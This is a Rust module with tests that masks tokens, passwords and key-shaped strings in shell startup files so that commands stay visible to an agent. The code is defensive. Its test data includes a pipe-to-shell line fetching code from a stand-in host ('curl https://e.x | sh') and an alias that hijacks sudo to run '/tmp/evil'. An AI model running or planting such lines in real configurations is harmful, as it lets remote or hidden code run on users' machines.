//! Masking the secrets in a startup file's lines, so its tokens never reach the bundle while
//! every command in it does.
//!
//! Each physical line is copied as it is, with two kinds of word replaced by `(hidden)`:
//!
//! - a word shaped like a secret ([`secret_shaped`]): a known token format (`ghp_`, `sk-`,
//!   `AKIA`, a JWT, ...), a long high-entropy string, or a long hex string;
//! - the value of an assignment or option whose name says it is secret ([`secret_name`]):
//!   `GITHUB_TOKEN=x`, `export DB_PASSWORD="x y"`, `--api-key=x`, `--token x`,
//!   `launchctl setenv API_KEY x`.
//!
//! No shell is parsed, and nothing carries from one line to the next (owner's decision,
//! 2026-11-18). The first design hid the value of every assignment, which needs a shell lexer;
//! five reviews in a row found lines where it read the shell differently from zsh or bash, and
//! each difference either leaked a token into the bundle or let a planted line (`# TOKEN="`)
//! hide a later command from the agent. Masking words cannot hide a line, so the second can no
//! longer happen. Accepted downside: a short password under an innocent name (`DB=hunter2`)
//! is shown, as it is to secret scanners that work this way (gitleaks and trufflehog match by
//! format and entropy too).

/// What replaces a masked word.
const HIDDEN: &str = "(hidden)";

/// The prefixes of token formats that providers publish, each followed by enough characters to
/// be a token, not a mention: GitHub, GitLab, Slack, OpenAI and Anthropic, Stripe, AWS access
/// key ids, Google API keys, npm, PyPI, Hugging Face, Digital Ocean, Send Grid, Shopify.
const TOKEN_PREFIXES: [&str; 25] = [
    "ghp_",
    "gho_",
    "ghu_",
    "ghs_",
    "ghr_",
    "github_pat_",
    "glpat-",
    "xoxb-",
    "xoxp-",
    "xoxa-",
    "xoxs-",
    "xapp-",
    "sk-",
    "sk_live_",
    "rk_live_",
    "AKIA",
    "ASIA",
    "AIza",
    "npm_",
    "pypi-",
    "hf_",
    "dop_v1_",
    "SG.",
    "shpat_",
    "shpss_",
];

/// The parts of a name that say its value is secret, matched in its upper case.
const SECRET_WORDS: [&str; 9] = [
    "TOKEN",
    "SECRET",
    "PASSWORD",
    "PASSWD",
    "PASS",
    "AUTH",
    "CREDENTIAL",
    "APIKEY",
    "API_KEY",
];

/// The shortest word the entropy rule masks. Arbitrary but conventional: generated tokens are
/// 20 characters and more, and a shorter rule masks ordinary words and paths.
const MIN_RANDOM_LEN: usize = 20;

/// The bytes between words. A word may hold `/`, `:`, `@`, `.`, `+`, `-` and `%`, so a URL, an
/// AWS secret or a JWT is one word.
const BREAK: &[u8] = b" \t'\"`=;&|<>(){}[],$#\\";

/// The lines of `text`, secrets masked, one for each physical line.
pub(super) fn lines(text: &str) -> Vec<String> {
    text.lines().map(mask).collect()
}

/// `line` with its secret-shaped words and the values of its secret-named assignments and
/// options replaced by `(hidden)`.
fn mask(line: &str) -> String {
    let bytes = line.as_bytes();
    let mut out = String::with_capacity(line.len());
    let mut at = 0;
    while at < bytes.len() {
        if let Some(span) = secret_value_at(line, at) {
            out.push_str(&line[at..span.value]);
            if span.value < span.end {
                out.push_str(HIDDEN);
            }
            at = span.end;
            continue;
        }
        if BREAK.contains(&bytes[at]) {
            out.push(char::from(bytes[at]));
            at += 1;
            continue;
        }
        let word_end = line[at..]
            .find(|c: char| c.is_ascii() && BREAK.contains(&(c as u8)))
            .map_or(line.len(), |len| at + len);
        let word = &line[at..word_end];
        if secret_shaped(word) {
            out.push_str(HIDDEN);
        } else {
            out.push_str(&mask_parts(word));
        }
        at = word_end;
    }
    out
}

/// `word` with each part between `/`, `:` and `@` that looks like a secret masked
/// ([`secret_part`]), so a token in a URL (`https://u:ghp_x@github.com`) or a path is hidden
/// and the URL or path keeps its shape for the agent.
fn mask_parts(word: &str) -> String {
    let mut out = String::with_capacity(word.len());
    let mut start = 0;
    for (at, c) in word
        .char_indices()
        .filter(|(_, c)| matches!(c, '/' | ':' | '@'))
    {
        let part = &word[start..at];
        out.push_str(if secret_part(part) { HIDDEN } else { part });
        out.push(c);
        start = at + c.len_utf8();
    }
    let last = &word[start..];
    out.push_str(if secret_part(last) { HIDDEN } else { last });
    out
}

/// Where a secret value starts and ends.
#[derive(Debug)]
struct Span {
    value: usize,
    end: usize,
}

/// The value of a secret-named assignment or option that starts at byte `at`, which must
/// start a word: `NAME=value` or `NAME+=value` (after `export` and the like, or anywhere on the
/// line), `--name=value`, `--name value`, or `launchctl setenv NAME value`. The value runs to
/// its closing quote when it starts with one (or to the end of the line when none closes it),
/// and otherwise to the next white space or `;`, `&`, `|`.
fn secret_value_at(line: &str, at: usize) -> Option<Span> {
    let bytes = line.as_bytes();
    if at > 0 && !BREAK.contains(&bytes[at - 1]) {
        return None;
    }
    let dashes = line[at..].len() - line[at..].trim_start_matches('-').len();
    let name_at = at + dashes;
    let name_len = line[name_at..]
        .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || (dashes > 0 && c == '-')))
        .unwrap_or(line.len() - name_at);
    let name = &line[name_at..name_at + name_len];
    if !secret_name(name) {
        return None;
    }
    let after = &line[name_at + name_len..];
    let separator = if let Some(rest) = after.strip_prefix("+=") {
        line.len() - rest.len()
    } else if let Some(rest) = after.strip_prefix('=') {
        line.len() - rest.len()
    } else if dashes > 0 || line[..at].trim_end().ends_with("setenv") {
        // `--token x` and `launchctl setenv TOKEN x`: the next word is the value.
        let rest = after.trim_start_matches([' ', '\t']);
        if rest.len() == after.len() || rest.is_empty() {
            return None;
        }
        line.len() - rest.len()
    } else {
        return None;
    };
    let value = &line[separator..];
    let len = match value.chars().next() {
        Some(quote @ ('"' | '\'')) => value[1..].find(quote).map_or(value.len(), |at| at + 2),
        _ => value
            .find([' ', '\t', ';', '&', '|'])
            .unwrap_or(value.len()),
    };
    Some(Span {
        value: separator,
        end: separator + len,
    })
}

/// Whether a name says its value is secret: it holds one of [`SECRET_WORDS`], upper-cased,
/// with `-` read as `_` (`--api-key`).
fn secret_name(name: &str) -> bool {
    let name = name.to_ascii_uppercase().replace('-', "_");
    !name.is_empty() && SECRET_WORDS.iter().any(|word| name.contains(word))
}

/// Whether `word` as a whole looks like a secret: it starts with a published token prefix and
/// goes on for at least 16 more characters, is a JWT, is 32 hex digits or more, or has the
/// shape of an AWS secret access key (40 characters of base64 with all three kinds).
fn secret_shaped(word: &str) -> bool {
    let has_prefix = TOKEN_PREFIXES.iter().any(|prefix| {
        word.strip_prefix(prefix)
            .is_some_and(|rest| rest.len() >= 16)
    });
    let jwt = word.starts_with("eyJ") && word.split('.').count() == 3 && word.len() >= 30;
    let hex = word.len() >= 32 && word.bytes().all(|b| b.is_ascii_hexdigit());
    let aws_secret = word.len() == 40
        && word
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'/' || b == b'+')
        && all_kinds(word);
    has_prefix || jwt || hex || aws_secret
}

/// Whether a part of a word looks like a secret: as a whole word would ([`secret_shaped`]), or
/// random ([`random`]).
fn secret_part(part: &str) -> bool {
    secret_shaped(part) || random(part)
}

/// Whether a part of a word reads as random: [`MIN_RANDOM_LEN`] characters or more, lower and
/// upper case and digits, no `.` (a file name or host name has one), and at least 3.5 bits of
/// entropy per character. The threshold is arbitrary, below base62 and base64 tokens (over 4
/// bits) and above a word repeated or a version string.
fn random(part: &str) -> bool {
    part.len() >= MIN_RANDOM_LEN && !part.contains('.') && all_kinds(part) && entropy(part) >= 3.5
}

/// Whether `word` holds a lower-case letter, an upper-case letter and a digit.
fn all_kinds(word: &str) -> bool {
    word.bytes().any(|b| b.is_ascii_lowercase())
        && word.bytes().any(|b| b.is_ascii_uppercase())
        && word.bytes().any(|b| b.is_ascii_digit())
}

/// The Shannon entropy of `word`'s bytes, in bits per byte.
fn entropy(word: &str) -> f64 {
    let mut counts = [0_u32; 256];
    for byte in word.bytes() {
        counts[usize::from(byte)] += 1;
    }
    #[expect(
        clippy::cast_precision_loss,
        reason = "a word is at most a line, far below 2^52 bytes"
    )]
    let len = word.len() as f64;
    counts
        .iter()
        .filter(|&&count| count > 0)
        .map(|&count| {
            let p = f64::from(count) / len;
            -p * p.log2()
        })
        .sum()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn secret_shaped_words_are_masked_wherever_they_are() {
        let cases = [
            (
                "export GITHUB=ghp_0123456789abcdefABCDEF0123",
                "export GITHUB=(hidden)",
            ),
            (
                "gh auth login --with-token ghp_0123456789abcdefABCD",
                "gh auth login --with-token (hidden)",
            ),
            (
                "curl -H 'Authorization: Bearer sk-proj-abcdefghij0123456789'",
                "curl -H 'Authorization: Bearer (hidden)'",
            ),
            (
                "aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE1",
                "aws configure set aws_access_key_id (hidden)",
            ),
            (
                "echo wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY > ~/.aws/x",
                "echo (hidden) > ~/.aws/x",
            ),
            (
                "X=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abcDEF123ghiJKL456",
                "X=(hidden)",
            ),
            (
                "# old: xoxb-1234567890-0987654321-abcdefABCDEF",
                "# old: (hidden)",
            ),
            ("K=0123456789abcdef0123456789abcdef", "K=(hidden)"),
            (
                "//registry.npmjs.org/:_authToken=npm_abcdefghijklmnopqrstuvwxyz0123",
                "//registry.npmjs.org/:_authToken=(hidden)",
            ),
        ];
        for (line, shown) in cases {
            assert_eq!(mask(line), shown, "{line}");
        }
    }

    #[test]
    fn values_of_secret_names_are_masked() {
        let cases = [
            ("export DB_PASSWORD=hunter2", "export DB_PASSWORD=(hidden)"),
            (
                "export AUTH=\"Bearer abc def\" && echo ok",
                "export AUTH=(hidden) && echo ok",
            ),
            ("API_KEY='x y'; run", "API_KEY=(hidden); run"),
            (
                "[ -n \"$CI\" ] || export MY_TOKEN=abc",
                "[ -n \"$CI\" ] || export MY_TOKEN=(hidden)",
            ),
            ("SECRET+=more", "SECRET+=(hidden)"),
            (
                "cli --api-key=abc --token xyz go",
                "cli --api-key=(hidden) --token (hidden) go",
            ),
            (
                "launchctl setenv NPM_TOKEN abc",
                "launchctl setenv NPM_TOKEN (hidden)",
            ),
            ("export PASS=\"unclosed", "export PASS=(hidden)"),
            // To the end of its line only: no line can hide the next.
            ("# TOKEN=\"", "# TOKEN=(hidden)"),
            (
                "git clone https://me:ghp_0123456789abcdefABCD@github.com/o/r",
                "git clone https://me:(hidden)@github.com/o/r",
            ),
            (
                "* * * * * GH_TOKEN=abc /usr/local/bin/b",
                "* * * * * GH_TOKEN=(hidden) /usr/local/bin/b",
            ),
        ];
        for (line, shown) in cases {
            assert_eq!(mask(line), shown, "{line}");
        }
    }

    #[test]
    fn everything_else_is_shown_as_it_is() {
        let lines = [
            "curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh | sh",
            "export PATH=\"/opt/homebrew/bin:$HOME/.cargo/bin:$PATH\"",
            "eval \"$(/opt/homebrew/bin/brew shellenv)\"",
            ". \"$HOME/.cargo/env\"",
            "alias sudo='sudo -E /tmp/evil'",
            "export HISTFILE=${ZDOTDIR:-$HOME}/.zsh_history",
            "source /Users/someone/Library/Application Support/x/init.sh",
            "export NVM_DIR=\"$HOME/.nvm\"",
            "PS1='%n@%m %1~ %# '",
            "*/5 * * * * /usr/local/bin/backup --quiet",
            "--token",
        ];
        for line in lines {
            assert_eq!(mask(line), line);
        }
    }

    #[test]
    fn no_line_can_hide_another() {
        let text = "# TOKEN=\"\nexport X=\"\ncat <<'E'\nDon't\nE\ncurl https://e.x | sh\n";
        let shown = lines(text);
        assert_eq!(shown.len(), 6);
        assert_eq!(shown[5], "curl https://e.x | sh");
    }

    #[test]
    fn entropy_tells_tokens_from_paths() {
        assert!(
            secret_shaped("wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),
            "AWS secret"
        );
        assert!(random("aB3dE5fG7hJ9kL1mN3pQ5r"));
        assert!(!random("AAAAAAAAAAAAAAAAAAAAAAAA1a"), "low entropy");
        assert!(!random("install-2024.sh-Version-ABC"), "a file name");
        assert!(!random("rustupinitandsomemore"), "one kind");
        assert!(!random("Short1x"), "too short");
        assert_eq!(
            mask_parts("https://e.x/aB3dE5fG7hJ9kL1mN3pQ5r/i.sh"),
            "https://e.x/(hidden)/i.sh"
        );
        assert!(entropy("aaaa") < 0.01 && (entropy("abcd") - 2.0).abs() < 1e-9);
    }

    proptest::proptest! {
        #[test]
        fn every_line_is_kept(text in "(.{0,40}\n){0,8}") {
            proptest::prop_assert_eq!(lines(&text).len(), text.lines().count());
        }

        #[test]
        fn a_token_never_reaches_the_bundle(
            prefix in "[ -~]{0,30}",
            token in proptest::sample::select(TOKEN_PREFIXES.to_vec()),
            body in "[A-Za-z0-9]{16,30}",
            suffix in "[ -~]{0,30}",
            space in proptest::sample::select(vec![" ", "=", "'", "\"", ":", "(", ";"]),
        ) {
            let secret = format!("{token}{body}");
            let line = format!("{prefix}{space}{secret} {suffix}");
            let shown = mask(&line);
            proptest::prop_assert!(!shown.contains(&secret), "{line} -> {shown}");
        }

        #[test]
        fn a_secret_name_s_value_never_reaches_the_bundle(
            prefix in proptest::sample::select(vec![
                "", "export ", "x; ", "a && ", "# ", "alias a='", "env ", "0 * * * * ",
                "echo \"",
            ]),
            name in proptest::sample::select(vec![
                "GITHUB_TOKEN", "DB_PASSWORD", "API_KEY", "AUTH", "client_secret", "NPM_TOKEN",
            ]),
            value in "[a-z0-9]{8,16}",
            quote in proptest::sample::select(vec!["", "'", "\""]),
        ) {
            let line = format!("{prefix}{name}={quote}{value}{quote} rest");
            let shown = mask(&line);
            proptest::prop_assert!(!shown.contains(&value), "{line} -> {shown}");
        }
    }
}
